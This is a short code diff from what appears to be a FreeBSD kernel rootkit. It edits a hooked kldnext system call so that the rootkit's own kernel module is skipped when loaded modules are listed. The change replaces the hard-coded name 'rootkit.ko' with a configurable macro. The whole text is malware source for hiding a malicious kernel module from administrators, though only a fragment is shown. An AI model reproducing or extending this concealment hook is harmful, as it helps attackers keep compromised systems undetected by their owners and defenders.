@@ -56,7 +56,7 @@ int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap)
 	while (lf != NULL && !(lf->flags & LINKER_FILE_LINKED))
 		lf = TAILQ_NEXT(lf, link);
 
-	if(strcmp(lf->filename, "rootkit.ko") == 0) {
+	if(strcmp(lf->filename, LINKER_FILE) == 0) {
 		lf = TAILQ_NEXT(lf, link);
 	}
 
